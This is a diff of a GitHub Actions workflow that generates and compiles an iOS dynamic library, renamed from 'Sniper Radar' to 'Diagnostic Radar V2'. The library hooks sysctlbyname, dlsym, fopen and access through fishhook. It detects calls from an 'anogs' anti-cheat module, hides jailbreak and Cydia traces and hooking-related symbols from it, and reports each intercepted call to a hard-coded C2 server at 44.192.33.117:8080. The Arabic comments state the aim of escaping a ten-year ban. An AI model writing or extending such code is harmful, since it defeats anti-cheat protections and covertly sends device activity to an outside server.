@@ -1,4 +1,4 @@
-name: Imperial V-MAX - Sniper Radar (Log + Protect)
+name: Imperial V-MAX - Diagnostic Radar V2 (Ghost Map)
 
 on:
   push:
@@ -6,8 +6,8 @@ on:
   workflow_dispatch:
 
 jobs:
-  build_sniper_radar:
-    name: Compile Sniper Radar
+  build_diagnostic_v2:
+    name: Compile Diagnostic Radar V2
     runs-on: macos-latest
 
     steps:
@@ -24,28 +24,32 @@ jobs:
         run: |
           cat <<'EOF' > jni/main.mm
           #import <Foundation/Foundation.h>
-          #import <dlfcn.h>
-          #import <sys/sysctl.h>
+          #import <mach-o/dyld.h>
+          #import <sys/mman.h>
           #import <sys/socket.h>
           #import <arpa/inet.h>
+          #import <dlfcn.h>
+          #import <sys/sysctl.h>
           #include "fishhook.h"
 
           // ⚠️ سيرفر مسعود
           #define C2_IP "44.192.33.117"
           #define C2_PORT 8080
 
-          /**
-           * ========================================================
-           * 🛡️ MASOUD SNIPER RADAR (LOGGING + OFFSET 0x459C PROTECTION)
-           * ========================================================
-           */
+          // ==========================================
+          // 🛡️ MASOUD GHOST MAP RADAR (BULLETPROOF)
+          // ==========================================
+          static uintptr_t g_anogs_base = 0;
+          static uintptr_t g_anogs_slide = 0;
+          static uintptr_t g_anogs_end = 0;
+          static bool g_anogs_found = false;
+
+          static NSMutableSet* g_reported_logs = nil;
 
           static int (*orig_sysctlbyname)(const char *name, void *oldp, size_t *oldlenp, void *newp, size_t newlen);
           static void* (*orig_dlsym)(void* handle, const char* symbol);
           static FILE* (*orig_fopen)(const char *filename, const char *mode);
           static int (*orig_access)(const char *path, int amode);
-
-          static NSMutableSet* g_reported_logs = nil;
 
           // الإرسال للسيرفر
           void SendRadarLog(NSString* funcName, uintptr_t offset, NSString* target, BOOL wasBlocked) {
@@ -80,25 +84,22 @@ jobs:
               });
           }
 
-          // جلب الأوفست الحقيقي
-          uintptr_t GetAnogsCallerOffset() {
-              void* ret_addr = __builtin_return_address(0);
-              Dl_info info;
-              if (dladdr(ret_addr, &info) && info.dli_fname) {
-                  NSString *caller = [[NSString stringWithUTF8String:info.dli_fname] lowercaseString];
-                  if ([caller containsString:@"anogs"]) {
-                      return (uintptr_t)ret_addr - (uintptr_t)info.dli_fbase;
-                  }
+          // 🔥 حساب الأوفست بالاعتماد على خريطة الذاكرة (مستحيل يفشل)
+          uintptr_t GetExactAnogsOffset() {
+              if (!g_anogs_found) return 0;
+              uintptr_t ret_addr = (uintptr_t)__builtin_return_address(0);
+              if (ret_addr >= g_anogs_base && ret_addr < g_anogs_end) {
+                  return ret_addr - g_anogs_slide; // إرجاع الأوفست الحقيقي مثل IDA
               }
               return 0;
           }
 
           // ==========================================
-          // ⚔️ خطافات الرادار + حماية مسعود (0x459C)
+          // 👁️ خطافات الرادار (تصطاد كل شيء)
           // ==========================================
 
           int hk_sysctlbyname(const char *name, void *oldp, size_t *oldlenp, void *newp, size_t newlen) {
-              uintptr_t offset = GetAnogsCallerOffset();
+              uintptr_t offset = GetExactAnogsOffset();
               if (offset > 0 && name) {
                   SendRadarLog(@"sysctlbyname", offset, [NSString stringWithUTF8String:name], NO);
               }
@@ -106,76 +107,84 @@ jobs:
           }
 
           void* hk_dlsym(void* handle, const char* symbol) {
-              uintptr_t offset = GetAnogsCallerOffset();
+              uintptr_t offset = GetExactAnogsOffset();
               BOOL block_it = NO;
 
               if (offset > 0 && symbol) {
                   NSString *symStr = [NSString stringWithUTF8String:symbol];
                   
-                  // 🔥 تفعيل حماية الأوفست 0x459C لمنع الـ 10 سنوات
+                  // 🔥 حماية أوفست 0x459C لمنع باند الـ 10 سنوات
                   if (offset > 0x4500 && offset < 0x4600) {
-                      NSArray *blocked_symbols = @[@"ptrace", @"MSHook", @"Substrate", @"fishhook", 
-                                                 @"sel_registerName", @"objc_getClass"];
+                      NSArray *blocked_symbols = @[@"ptrace", @"MSHook", @"Substrate", @"fishhook", @"sel_registerName"];
                       for (NSString *blocked in blocked_symbols) {
                           if ([symStr containsString:blocked]) {
-                              block_it = YES; // حظر لإنقاذ الحساب
+                              block_it = YES;
                               break;
                           }
                       }
                   }
                   
                   SendRadarLog(@"dlsym", offset, symStr, block_it);
-                  
-                  if (block_it) return NULL; // إعماء الجاسوس
+                  if (block_it) return NULL;
               }
               return orig_dlsym(handle, symbol);
           }
 
           FILE* hk_fopen(const char *filename, const char *mode) {
-              uintptr_t offset = GetAnogsCallerOffset();
+              uintptr_t offset = GetExactAnogsOffset();
               BOOL block_it = NO;
 
               if (offset > 0 && filename) {
                   NSString *fileStr = [NSString stringWithUTF8String:filename];
-                  
-                  // 🔥 حظر قراءة الملفات المشبوهة
-                  if ([fileStr containsString:@"Cydia"] || [fileStr containsString:@"TDM_KV"]) {
-                      block_it = YES;
-                  }
+                  if ([fileStr containsString:@"Cydia"] || [fileStr containsString:@"TDM_KV"]) block_it = YES;
                   
                   SendRadarLog(@"fopen", offset, fileStr, block_it);
-                  
                   if (block_it) return NULL;
               }
               return orig_fopen(filename, mode);
           }
           
           int hk_access(const char *path, int amode) {
-              uintptr_t offset = GetAnogsCallerOffset();
+              uintptr_t offset = GetExactAnogsOffset();
               BOOL block_it = NO;
 
               if (offset > 0 && path) {
                   NSString *pathStr = [NSString stringWithUTF8String:path];
-                  if ([pathStr containsString:@"Cydia"] || [pathStr containsString:@"TDM_KV"]) {
-                      block_it = YES;
-                  }
+                  if ([pathStr containsString:@"Cydia"] || [pathStr containsString:@"TDM_KV"]) block_it = YES;
                   
                   SendRadarLog(@"access", offset, pathStr, block_it);
-                  
                   if (block_it) return -1;
               }
               return orig_access(path, amode);
           }
 
           // ==========================================
-          // 🚀 التشغيل
+          // 🚀 التهيئة والبحث عن Anogs بالذاكرة
           // ==========================================
+          void InitializeGhostMap() {
+              dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_HIGH, 0), ^{
+                  while (!g_anogs_found) {
+                      for (uint32_t i = 0; i < _dyld_image_count(); i++) {
+                          if (strstr(_dyld_get_image_name(i), "anogs")) {
+                              g_anogs_slide = _dyld_get_image_vmaddr_slide(i);
+                              g_anogs_base = (uintptr_t)_dyld_get_image_header(i);
+                              g_anogs_end = g_anogs_base + 0x8000000; // مساحة الملف كاملة
+                              g_anogs_found = true;
+                              SendRadarLog(@"SYSTEM", 0x0, @"Ghost Map Locked on anogs!", NO);
+                              break;
+                          }
+                      }
+                      if (!g_anogs_found) sleep(1);
+                  }
+              });
+          }
+
           __attribute__((constructor))
-          static void start_sniper_radar() {
+          static void start_v2_radar() {
               g_reported_logs = [[NSMutableSet alloc] init];
               
-              NSLog(@"[MASOUD LAB] 🦅 SNIPER RADAR LOADED (10-YEAR BAN PROTECTED)!");
-              SendRadarLog(@"RADAR_INIT", 0x0, @"Sniper Radar Active", NO);
+              NSLog(@"[MASOUD LAB] 🦅 V2 GHOST MAP RADAR LOADED!");
+              SendRadarLog(@"RADAR_INIT", 0x0, @"V2 Radar Active", NO);
               
               struct rebinding hooks[] = {
                   {"sysctlbyname", (void *)hk_sysctlbyname, (void **)&orig_sysctlbyname},
@@ -184,19 +193,21 @@ jobs:
                   {"access", (void *)hk_access, (void **)&orig_access}
               };
               rebind_symbols(hooks, 4);
+              
+              InitializeGhostMap();
           }
           EOF
 
-      - name: Compile Sniper Radar
+      - name: Compile V2 Radar
         run: |
           clang++ -dynamiclib -std=c++11 -arch arm64 \
           -isysroot $(xcrun --sdk iphoneos --show-sdk-path) \
-          jni/main.mm jni/fishhook.cpp -o Masoud-Sniper-Radar.dylib \
+          jni/main.mm jni/fishhook.cpp -o Masoud-Diagnostic-V2.dylib \
           -framework Foundation
-          strip -x Masoud-Sniper-Radar.dylib
+          strip -x Masoud-Diagnostic-V2.dylib
 
       - name: Upload Artifact
         uses: actions/upload-artifact@v4
         with:
-          name: Masoud-Sniper-Radar
-          path: Masoud-Sniper-Radar.dylib
+          name: Masoud-Diagnostic-V2
+          path: Masoud-Diagnostic-V2.dylib
